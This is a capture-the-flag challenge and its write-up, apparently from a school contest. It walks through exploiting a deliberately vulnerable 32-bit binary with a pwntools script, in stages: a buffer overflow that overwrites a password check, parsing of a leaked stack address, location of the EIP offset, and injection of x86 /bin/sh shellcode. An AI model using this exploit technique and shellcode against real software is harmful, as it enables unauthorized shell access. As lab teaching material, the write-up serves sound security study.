# Early? Easy as PIE

It's Monday morning. You're a Rafflesian who's going to get a conduct slip for being late 3 times!

You sprint to the Marymount Gate, but it's locked! You could walk to the Main Gate... but then you'll get detention!.

Luckily, you remember that the Marymount Gate runs on a janky system developed by a former RJC computing student as part of a 2002 PW project. It's full of vulnerabilities — if you can break in, you can force the gate open and make it to assembly on time.

After all, who needs an adrenaline injection when you are racing against time?


# Early? Easy as PIE — Writeup

## Overview

We are given a 32-bit (`-m32`) binary with the following vulnerabilities (`use checksec --file=vuln`):
- **Stack buffer overflow** (in both `hint()` and `vuln()`)
- **Leaked stack address** (we can inject shellcode into the stack)
- **Executable stack** (`-z execstack`), allowing shellcode execution
- **No stack canaries** (`-fno-stack-protector`), making exploitation easier

The objective is to:
1. Overflow `hint()`'s buffer to modify the `password` variable.
2. Leak a stack address from `vuln()`.
3. Inject shellcode onto the stack and pivot execution to it.

---

# Step-by-Step Exploit

## Setup

```python
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''

exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
```

- We define a `start()` function to easily toggle between local, GDB, or remote execution.
- `context.binary` automatically detects architecture, bits, OS.
- GDB is set up with a simple script that initializes pwndbg and continues.

---

## Stage 1: Overflow `hint()` to get access to `vuln()`

```python
# Start process
io = start()

# Constructing first payload
payload = b"\x00" * 10 + p32(0xdeadbeef)
# Sending first payload
io.sendline(payload)
```

- In `hint()`, there is a 10-byte input buffer.
- By overflowing the buffer and directly overwriting the `password` variable with `0xdeadbeef`, we bypass the security check and reach `vuln()`.
- `\x00` padding is used because input is treated as a string.

---

## Stage 2: Leak the stack address

```python
# Read and print leaked address
io.recvuntil(b"at: ")
leak = io.recvline()
shellcodeAdr = int(leak.decode().strip(), 16)
log.info(f"Leaked address: {hex(shellcodeAdr)}")
```

- After reaching `vuln()`, the program leaks the address of the `buffer` on the stack.
- We capture and parse this address for later use (to inject shellcode).

---

## Stage 3: Find the buffer overflow offset

```python
payload = b""
payload += cyclic(500)
# Sending second payload
io.sendline(payload)

io.wait()

# Get EIP offset
core = io.corefile
eip_value = core.eip
eip_offset = cyclic_find(eip_value)
info('located EIP offset at {a}'.format(a=eip_offset))
```

- We send a cyclic pattern (`cyclic(500)`) to crash the program.
- After the crash, we use `pwntools` to inspect the core dump and find the exact offset where the return address (EIP) is overwritten.
- This ensures that our final payload will correctly control execution.

---

## Stage 4: Final Shellcode Exploit

```python
# Start new process
io = start()

# Constructing first payload again
payload = b"\x00" * 10 + p32(0xdeadbeef)
io.sendline(payload)

# Read and print leaked address again
io.recvuntil(b"at: ")
leak = io.recvline()
shellcodeAdr = int(leak.decode().strip(), 16)
log.info(f"Leaked address: {hex(shellcodeAdr)}")
```

- We restart the binary to exploit it cleanly without needing to crash first.
- Re-bypass the password check to access `vuln()` and re-leak the stack address.

```python
# Constructing second payload
payload = b""
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"  # xor eax,eax; push "//sh"
payload += b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"  # push "/bin"; mov ebx,esp; push eax
payload += b"\x53\x89\xe1\xb0\x0b\xcd\x80"      # push ebx; mov ecx,esp; mov al,0xb; int 0x80
payload += b"\x00" * (eip_offset - len(payload)) # Padding to reach return address
payload += p32(shellcodeAdr)                     # Overwrite return address with shellcode address
# Sending second payload
io.sendline(payload)

io.interactive()
```

- We inject classic Linux x86 shellcode to execute `/bin/sh`.
- The payload is padded to exactly reach the return address.
- Finally, we overwrite the return address with the leaked buffer address to jump to our shellcode.
- After sending, we drop into an interactive shell!

---

# Key Takeaways

- Overflow the first buffer to unlock access to the vulnerable function.
- Leak a stack address to place your shellcode somewhere predictable.
- Carefully calculate offsets to control the return address.
- Old C binaries with `gets()` and executable stacks are perfect for shellcode injection!

---
